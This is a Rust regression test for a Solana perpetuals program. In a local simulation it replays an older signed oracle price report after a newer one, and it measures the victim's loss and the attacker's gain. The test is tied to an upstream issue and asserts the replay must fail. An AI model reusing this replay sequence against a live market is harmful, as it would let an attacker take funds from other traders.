use litesvm::LiteSVM;
use solana_sdk::{
    account::Account,
    clock::Clock,
    compute_budget::ComputeBudgetInstruction,
    hash::Hash,
    instruction::{AccountMeta, Instruction},
    program_pack::Pack,
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::Transaction,
};
use std::path::PathBuf;

use percolator_prog::ix::Instruction as PIx;

const DEPOSIT: u64 = 1_000_000;
const INITIAL_PRICE: u64 = 1_000_000;
const MOVED_PRICE: u64 = 500_000;
const START_SLOT: u64 = 100;
const OLD_REPORT_SLOT: u64 = 101;
const NEW_REPORT_SLOT: u64 = 110;
const REPLAY_SLOT: u64 = 111;
const ATA_PROGRAM_ID: Pubkey = solana_sdk::pubkey!("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");

#[derive(Debug, PartialEq, Eq)]
struct Outcome {
    stale_report_accepted: bool,
    effective_price: u64,
    victim_loss: u128,
    attacker_gain: u128,
    crystallized_loss: u128,
}

fn perc_id() -> Pubkey {
    percolator_prog::id()
}

fn perc_so() -> PathBuf {
    if let Ok(target) = std::env::var("CARGO_TARGET_DIR") {
        return PathBuf::from(target).join("deploy/percolator_prog.so");
    }
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../target/deploy/percolator_prog.so")
}

fn pix(accounts: Vec<AccountMeta>, ix: PIx) -> Instruction {
    Instruction {
        program_id: perc_id(),
        accounts,
        data: ix.encode(),
    }
}

fn send(svm: &mut LiteSVM, signers: &[&Keypair], ix: Instruction) -> Result<(), String> {
    svm.expire_blockhash();
    let blockhash = svm.latest_blockhash();
    svm.send_transaction(Transaction::new_signed_with_payer(
        &[ix],
        Some(&signers[0].pubkey()),
        signers,
        blockhash,
    ))
    .map(|_| ())
    .map_err(|error| format!("{:?}", error.err))
}

fn transaction_with_variant(
    payer: &Keypair,
    signers: &[&Keypair],
    instruction: Instruction,
    blockhash: Hash,
    variant: u32,
) -> Transaction {
    Transaction::new_signed_with_payer(
        &[
            ComputeBudgetInstruction::set_compute_unit_limit(1_399_000 + variant),
            instruction,
        ],
        Some(&payer.pubkey()),
        signers,
        blockhash,
    )
}

fn send_with_variant(
    svm: &mut LiteSVM,
    payer: &Keypair,
    signers: &[&Keypair],
    instruction: Instruction,
    blockhash: Hash,
    variant: u32,
) -> Result<(), String> {
    svm.send_transaction(transaction_with_variant(
        payer,
        signers,
        instruction,
        blockhash,
        variant,
    ))
    .map(|_| ())
    .map_err(|error| format!("{:?}", error.err))
}

fn token_account_data(mint: &Pubkey, owner: &Pubkey, amount: u64) -> Vec<u8> {
    let mut data = vec![0u8; spl_token::state::Account::LEN];
    data[0..32].copy_from_slice(mint.as_ref());
    data[32..64].copy_from_slice(owner.as_ref());
    data[64..72].copy_from_slice(&amount.to_le_bytes());
    data[108] = 1;
    data
}

fn set_token(svm: &mut LiteSVM, key: &Pubkey, mint: &Pubkey, owner: &Pubkey, amount: u64) {
    svm.set_account(
        *key,
        Account {
            lamports: 2_000_000,
            data: token_account_data(mint, owner, amount),
            owner: spl_token::ID,
            executable: false,
            rent_epoch: 0,
        },
    )
    .unwrap();
}

fn create_mint(svm: &mut LiteSVM, payer: &Keypair, authority: &Pubkey) -> Pubkey {
    let mint = Keypair::new();
    send(
        svm,
        &[payer, &mint],
        solana_sdk::system_instruction::create_account(
            &payer.pubkey(),
            &mint.pubkey(),
            svm.minimum_balance_for_rent_exemption(spl_token::state::Mint::LEN),
            spl_token::state::Mint::LEN as u64,
            &spl_token::ID,
        ),
    )
    .unwrap();
    send(
        svm,
        &[payer],
        spl_token::instruction::initialize_mint(&spl_token::ID, &mint.pubkey(), authority, None, 6)
            .unwrap(),
    )
    .unwrap();
    mint.pubkey()
}

fn vault_authority(market: &Pubkey) -> Pubkey {
    Pubkey::find_program_address(&[b"vault", market.as_ref()], &perc_id()).0
}

fn canonical_vault(authority: &Pubkey, mint: &Pubkey) -> Pubkey {
    Pubkey::find_program_address(
        &[authority.as_ref(), spl_token::ID.as_ref(), mint.as_ref()],
        &ATA_PROGRAM_ID,
    )
    .0
}

fn portfolio_capital(svm: &LiteSVM, portfolio: &Pubkey) -> u128 {
    percolator_prog::state::read_portfolio(&svm.get_account(portfolio).unwrap().data)
        .unwrap()
        .capital
        .get()
}

fn effective_price(svm: &LiteSVM, market: &Pubkey) -> u64 {
    let data = svm.get_account(market).unwrap().data;
    let (_, group) = percolator_prog::state::read_market(&data).unwrap();
    group.assets[0].effective_price
}

fn crystallized_loss(svm: &LiteSVM, portfolio: &Pubkey) -> u128 {
    let data = svm.get_account(portfolio).unwrap().data;
    u128::from_le_bytes(data[196..212].try_into().unwrap())
}

fn run(reorder: bool) -> Outcome {
    let mut svm =
        LiteSVM::new().with_compute_budget(solana_program_runtime::compute_budget::ComputeBudget {
            compute_unit_limit: 1_400_000,
            heap_size: 256 * 1024,
            ..solana_program_runtime::compute_budget::ComputeBudget::default()
        });
    svm.add_program_from_file(perc_id(), perc_so()).unwrap();

    let payer = Keypair::new();
    let creator = Keypair::new();
    let oracle = Keypair::new();
    let attacker = Keypair::new();
    let victim = Keypair::new();
    for signer in [&payer, &creator, &oracle, &attacker, &victim] {
        svm.airdrop(&signer.pubkey(), 100_000_000_000).unwrap();
    }
    svm.set_sysvar(&Clock {
        slot: START_SLOT,
        unix_timestamp: START_SLOT as i64,
        ..Clock::default()
    });

    let mint_authority = Keypair::new();
    let collateral_mint = create_mint(&mut svm, &payer, &mint_authority.pubkey());
    let market = Keypair::new();
    let market_len = percolator_prog::state::market_account_len_for_capacity(1).unwrap();
    let market_rent = svm.minimum_balance_for_rent_exemption(market_len);
    send(
        &mut svm,
        &[&payer, &market],
        solana_sdk::system_instruction::create_account(
            &payer.pubkey(),
            &market.pubkey(),
            market_rent,
            market_len as u64,
            &perc_id(),
        ),
    )
    .unwrap();
    send(
        &mut svm,
        &[&payer, &creator],
        pix(
            vec![
                AccountMeta::new_readonly(creator.pubkey(), true),
                AccountMeta::new(market.pubkey(), false),
                AccountMeta::new_readonly(collateral_mint, false),
            ],
            PIx::InitMarket {
                max_portfolio_assets: 1,
                h_min: 0,
                h_max: 10,
                initial_price: INITIAL_PRICE,
                min_nonzero_mm_req: 1,
                min_nonzero_im_req: 2,
                maintenance_margin_bps: 10_000,
                initial_margin_bps: 10_000,
                max_trading_fee_bps: 10_000,
                trade_fee_base_bps: 0,
                liquidation_fee_bps: 0,
                liquidation_fee_cap: 0,
                min_liquidation_abs: 0,
                max_price_move_bps_per_slot: 10_000,
                max_accrual_dt_slots: 1,
                max_abs_funding_e9_per_slot: 0,
                min_funding_lifetime_slots: 1,
                max_account_b_settlement_chunks: 1,
                max_bankrupt_close_chunks: 1,
                max_bankrupt_close_lifetime_slots: 100,
                public_b_chunk_atoms: percolator::MAX_VAULT_TVL,
                maintenance_fee_per_slot: 0,
            },
        ),
    )
    .unwrap();
    send(
        &mut svm,
        &[&payer, &creator, &oracle],
        pix(
            vec![
                AccountMeta::new_readonly(creator.pubkey(), true),
                AccountMeta::new_readonly(oracle.pubkey(), true),
                AccountMeta::new(market.pubkey(), false),
            ],
            PIx::UpdateAssetAuthority {
                asset_index: 0,
                kind: 4,
                new_pubkey: oracle.pubkey().to_bytes(),
            },
        ),
    )
    .unwrap();
    send(
        &mut svm,
        &[&payer, &oracle],
        pix(
            vec![
                AccountMeta::new_readonly(oracle.pubkey(), true),
                AccountMeta::new(market.pubkey(), false),
            ],
            PIx::ConfigureAuthMark {
                asset_index: 0,
                now_slot: START_SLOT,
                initial_mark_e6: INITIAL_PRICE,
            },
        ),
    )
    .unwrap();

    let authority = vault_authority(&market.pubkey());
    let vault = canonical_vault(&authority, &collateral_mint);
    set_token(&mut svm, &vault, &collateral_mint, &authority, 0);

    let attacker_portfolio = Keypair::new();
    let victim_portfolio = Keypair::new();
    let portfolio_len = percolator_prog::state::portfolio_account_len_for_market_slots(1).unwrap();
    let portfolio_rent = svm.minimum_balance_for_rent_exemption(portfolio_len);
    for (owner, portfolio) in [
        (&attacker, &attacker_portfolio),
        (&victim, &victim_portfolio),
    ] {
        send(
            &mut svm,
            &[&payer, portfolio],
            solana_sdk::system_instruction::create_account(
                &payer.pubkey(),
                &portfolio.pubkey(),
                portfolio_rent,
                portfolio_len as u64,
                &perc_id(),
            ),
        )
        .unwrap();
        send(
            &mut svm,
            &[&payer, owner],
            pix(
                vec![
                    AccountMeta::new_readonly(owner.pubkey(), true),
                    AccountMeta::new(market.pubkey(), false),
                    AccountMeta::new(portfolio.pubkey(), false),
                ],
                PIx::InitPortfolio,
            ),
        )
        .unwrap();
        let source = Pubkey::new_unique();
        set_token(
            &mut svm,
            &source,
            &collateral_mint,
            &owner.pubkey(),
            DEPOSIT,
        );
        send(
            &mut svm,
            &[&payer, owner],
            pix(
                vec![
                    AccountMeta::new_readonly(owner.pubkey(), true),
                    AccountMeta::new(market.pubkey(), false),
                    AccountMeta::new(portfolio.pubkey(), false),
                    AccountMeta::new(source, false),
                    AccountMeta::new(vault, false),
                    AccountMeta::new_readonly(spl_token::ID, false),
                ],
                PIx::Deposit {
                    amount: u128::from(DEPOSIT),
                },
            ),
        )
        .unwrap();
    }

    let backing_source = Pubkey::new_unique();
    set_token(
        &mut svm,
        &backing_source,
        &collateral_mint,
        &creator.pubkey(),
        1,
    );
    send(
        &mut svm,
        &[&payer, &creator],
        pix(
            vec![
                AccountMeta::new_readonly(creator.pubkey(), true),
                AccountMeta::new(market.pubkey(), false),
                AccountMeta::new(backing_source, false),
                AccountMeta::new(vault, false),
                AccountMeta::new_readonly(spl_token::ID, false),
            ],
            PIx::TopUpBackingBucket {
                domain: 0,
                amount: 1,
                expiry_slot: 10_000,
            },
        ),
    )
    .unwrap();

    let blockhash = svm.latest_blockhash();
    let old_report = transaction_with_variant(
        &payer,
        &[&payer, &oracle],
        pix(
            vec![
                AccountMeta::new_readonly(oracle.pubkey(), true),
                AccountMeta::new(market.pubkey(), false),
            ],
            PIx::PushAuthMark {
                asset_index: 0,
                now_slot: OLD_REPORT_SLOT,
                mark_e6: INITIAL_PRICE,
            },
        ),
        blockhash,
        1,
    );

    svm.set_sysvar(&Clock {
        slot: NEW_REPORT_SLOT,
        unix_timestamp: NEW_REPORT_SLOT as i64,
        ..Clock::default()
    });
    send_with_variant(
        &mut svm,
        &payer,
        &[&payer, &oracle],
        pix(
            vec![
                AccountMeta::new_readonly(oracle.pubkey(), true),
                AccountMeta::new(market.pubkey(), false),
            ],
            PIx::PushAuthMark {
                asset_index: 0,
                now_slot: NEW_REPORT_SLOT,
                mark_e6: MOVED_PRICE,
            },
        ),
        blockhash,
        2,
    )
    .expect("the newer independently signed oracle report lands first");
    let crank = |portfolio: Pubkey, claimed_slot: u64| {
        pix(
            vec![
                AccountMeta::new_readonly(payer.pubkey(), true),
                AccountMeta::new(market.pubkey(), false),
                AccountMeta::new(portfolio, false),
            ],
            PIx::PermissionlessCrank {
                now_slot: claimed_slot,
                observations: vec![percolator_prog::ix::CrankObservationHint {
                    asset_index: 0,
                    oracle_accounts: 0,
                }],
            },
        )
    };
    send_with_variant(
        &mut svm,
        &payer,
        &[&payer],
        crank(attacker_portfolio.pubkey(), NEW_REPORT_SLOT),
        blockhash,
        3,
    )
    .unwrap();
    assert_eq!(
        effective_price(&svm, &market.pubkey()),
        MOVED_PRICE,
        "the new report is the live trading mark before the victim signs"
    );

    let position_q = (percolator::POS_SCALE / 4) as i128;
    send_with_variant(
        &mut svm,
        &payer,
        &[&payer, &attacker, &victim],
        pix(
            vec![
                AccountMeta::new_readonly(attacker.pubkey(), true),
                AccountMeta::new_readonly(victim.pubkey(), true),
                AccountMeta::new(market.pubkey(), false),
                AccountMeta::new(attacker_portfolio.pubkey(), false),
                AccountMeta::new(victim_portfolio.pubkey(), false),
            ],
            PIx::TradeNoCpi {
                asset_index: 0,
                size_q: position_q,
                exec_price: MOVED_PRICE,
                fee_bps: 0,
            },
        ),
        blockhash,
        4,
    )
    .expect("the attacker and independent victim trade at the newer authenticated mark");

    svm.set_sysvar(&Clock {
        slot: REPLAY_SLOT,
        unix_timestamp: REPLAY_SLOT as i64,
        ..Clock::default()
    });
    let stale_report_accepted = reorder && svm.send_transaction(old_report).is_ok();
    let expected_price = if stale_report_accepted {
        INITIAL_PRICE
    } else {
        MOVED_PRICE
    };
    for (variant, portfolio) in [
        (5, attacker_portfolio.pubkey()),
        (6, attacker_portfolio.pubkey()),
        (7, victim_portfolio.pubkey()),
        (8, victim_portfolio.pubkey()),
    ] {
        send_with_variant(
            &mut svm,
            &payer,
            &[&payer],
            crank(portfolio, REPLAY_SLOT + u64::from(variant)),
            blockhash,
            variant,
        )
        .unwrap();
    }
    assert_eq!(
        effective_price(&svm, &market.pubkey()),
        expected_price,
        "the retained old signature must not become the live mark"
    );

    send_with_variant(
        &mut svm,
        &payer,
        &[&payer, &attacker, &victim],
        pix(
            vec![
                AccountMeta::new_readonly(attacker.pubkey(), true),
                AccountMeta::new_readonly(victim.pubkey(), true),
                AccountMeta::new(market.pubkey(), false),
                AccountMeta::new(attacker_portfolio.pubkey(), false),
                AccountMeta::new(victim_portfolio.pubkey(), false),
            ],
            PIx::TradeNoCpi {
                asset_index: 0,
                size_q: -position_q,
                exec_price: expected_price,
                fee_bps: 0,
            },
        ),
        blockhash,
        9,
    )
    .expect("the users flatten at the mark selected by report ordering");
    for (variant, portfolio) in [
        (10, attacker_portfolio.pubkey()),
        (11, victim_portfolio.pubkey()),
    ] {
        send_with_variant(
            &mut svm,
            &payer,
            &[&payer],
            crank(portfolio, REPLAY_SLOT + u64::from(variant)),
            blockhash,
            variant,
        )
        .unwrap();
    }

    let victim_loss = u128::from(DEPOSIT)
        .checked_sub(portfolio_capital(&svm, &victim_portfolio.pubkey()))
        .unwrap();
    let attacker_before = portfolio_capital(&svm, &attacker_portfolio.pubkey());
    if stale_report_accepted {
        send_with_variant(
            &mut svm,
            &payer,
            &[&payer, &attacker],
            pix(
                vec![
                    AccountMeta::new_readonly(attacker.pubkey(), true),
                    AccountMeta::new(market.pubkey(), false),
                    AccountMeta::new(attacker_portfolio.pubkey(), false),
                ],
                PIx::ConvertReleasedPnl { amount: u128::MAX },
            ),
            blockhash,
            12,
        )
        .expect("the attacker converts the loss caused by the reordered report");
    }
    let attacker_gain = portfolio_capital(&svm, &attacker_portfolio.pubkey())
        .checked_sub(attacker_before)
        .unwrap();

    Outcome {
        stale_report_accepted,
        effective_price: effective_price(&svm, &market.pubkey()),
        victim_loss,
        attacker_gain,
        crystallized_loss: crystallized_loss(&svm, &victim_portfolio.pubkey()),
    }
}

#[test]
#[ignore = "upstream percolator-prog#390: signed mark reports need a monotonic sequence"]
fn older_signed_auth_mark_cannot_overwrite_a_newer_report() {
    let control = run(false);
    let reordered = run(true);

    assert!(
        !reordered.stale_report_accepted,
        "an older signed report landed as fresh: control={control:?} reordered={reordered:?}"
    );
    assert_eq!(
        reordered.victim_loss, control.victim_loss,
        "report reordering must not create an independent-user loss"
    );
    assert_eq!(
        reordered.attacker_gain, control.attacker_gain,
        "report reordering must not create attacker-extractable capital"
    );
}
